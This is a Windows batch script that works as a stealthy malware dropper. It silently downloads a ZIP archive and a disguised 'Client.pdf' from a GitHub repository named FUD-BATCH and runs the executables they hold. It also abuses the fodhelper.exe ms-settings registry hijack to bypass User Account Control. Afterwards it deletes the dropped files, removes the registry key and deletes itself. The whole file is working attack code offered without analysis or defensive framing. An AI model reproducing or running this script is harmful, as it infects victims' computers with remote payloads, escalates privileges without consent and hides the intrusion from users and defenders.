@echo off
setlocal

:: Set the download URL and the target paths
set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Zone.zip"
set "zip_output=C:\Users\%USERNAME%\AppData\Zone.zip"
set "exe_output=C:\Users\%USERNAME%\AppData\Zone.exe"

:: Download the Zone.zip file using PowerShell silently
powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%zip_output%'" >nul 2>&1

:: Check if the download was successful
if exist "%zip_output%" (
    :: Extract Zone.exe from Zone.zip silently
    powershell -command "Expand-Archive -Path '%zip_output%' -DestinationPath 'C:\Users\%USERNAME%\AppData\' -Force" >nul 2>&1
) else (
    exit /b 1
)

:: Check if extraction was successful (Zone.exe exists)
if exist "%exe_output%" (
    rem Extraction successful, proceed
) else (
    exit /b 1
)

:: Create the registry key for ms-settings silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f >nul 2>&1

:: Set the DelegateExecute property silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1

:: Wait for 12 seconds silently
timeout /t 12 /nobreak >nul 2>&1

:: Set the default value to run Zone.exe silently
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "%exe_output%" /f >nul 2>&1

:: Wait for another 12 seconds silently
timeout /t 12 /nobreak >nul 2>&1

:: Start fodhelper.exe silently to escalate privileges
start /min "" "C:\Windows\System32\fodhelper.exe" >nul 2>&1

:: Wait for 12 seconds silently
timeout /t 12 /nobreak >nul 2>&1

:: Set the download URL and the target path for Client.pdf
set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Client.pdf"
set "output2=C:\Users\%USERNAME%\AppData\Local\sam.exe"

:: Download the Client.pdf file using PowerShell silently
powershell -command "Invoke-WebRequest -Uri '%url2%' -OutFile '%output2%' -UseBasicP -ErrorAction Stop" >nul 2>&1

:: Check if the download was successful without echoing messages
if exist "%output2%" (
    rem Downloaded successfully, proceed to rename
) else (
    exit /b 1
)

:: Convert client.pdf to client.exe by renaming silently
ren "%output2%" "sam.exe" >nul 2>&1

:: Run sam.exe two times silently
start /min "" "%output2:pdf=exe%" >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1
start /min "" "%output2:pdf=exe%" >nul 2>&1

:: Wait for 3 seconds before deleting files
timeout /t 3 /nobreak >nul 2>&1

:: Delete Zone.exe and Zone.zip
del "%exe_output%" >nul 2>&1
del "%zip_output%" >nul 2>&1

:: Remove the ms-settings registry key immediately before self-deletion
powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force" >nul 2>&1

:: Delete the expert.bat file in AppData if it exists
set "expert_bat=C:\Users\%USERNAME%\AppData\expert.bat"
if exist "%expert_bat%" (
    del "%expert_bat%" >nul 2>&1
)

:: Create a secondary batch script to delete this script
(
echo @echo off
echo :Repeat
echo del "%~f0" ^>nul 2^>^&1
echo if exist "%~f0" goto Repeat
) > "%TEMP%\delete_self.bat"

:: Run the secondary batch script to delete this script
start /min "" "%TEMP%\delete_self.bat"

endlocal
